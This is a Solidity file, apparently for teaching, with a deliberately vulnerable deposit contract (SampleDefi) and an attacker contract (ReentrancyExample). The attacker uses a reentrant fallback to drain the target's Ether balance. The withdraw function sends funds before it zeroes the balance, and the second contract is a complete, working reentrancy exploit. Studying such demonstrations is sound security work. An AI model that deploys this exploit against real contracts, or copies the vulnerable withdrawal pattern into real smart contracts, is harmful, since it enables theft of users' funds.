// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

//  ==========  SampleDefi Contract    ==========

/// @dev This contract is the vulnerable contract on which we are going to test reentrancy
contract SampleDefi {

    /*///////////////////////////////////////////////////////////////
                            State variables
    //////////////////////////////////////////////////////////////*/

    // Mapping of address to corresponding balances
    mapping(address => uint) public balances;


    /*///////////////////////////////////////////////////////////////
                            State Changing Functions
    //////////////////////////////////////////////////////////////*/

    /// @dev deposits made to this contract
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /// @dev withdrawal function...This is the function that is vulnerable
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0, 'Nothing to withdraw');

        (bool sent, ) = payable(msg.sender).call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
}

//  ==========  ReentrancyExample Contract    ==========

/// @dev This contract will test reentrancy
contract ReentrancyExample {

    /*///////////////////////////////////////////////////////////////
                            State variables
    //////////////////////////////////////////////////////////////*/

    // To store the reference to the vulnerable defi app
    SampleDefi dapp;

    /*///////////////////////////////////////////////////////////////
                            Constructor
    //////////////////////////////////////////////////////////////*/

    // Requires defi app address as an input
    constructor(address _address) {
        dapp = SampleDefi(_address);
    }

    /// @dev The main function that is called to start the reentrancy project
    function reentry() public payable {
        require(msg.value >= 1 ether);
        dapp.deposit{value: 1 ether}();
        dapp.withdraw();
    }

    /// @dev fallback to this function and repeat the process till the contract is not empty
    fallback() external payable {
        if(address(dapp).balance >= 1 ether) {
            dapp.withdraw();
        }
    }
}
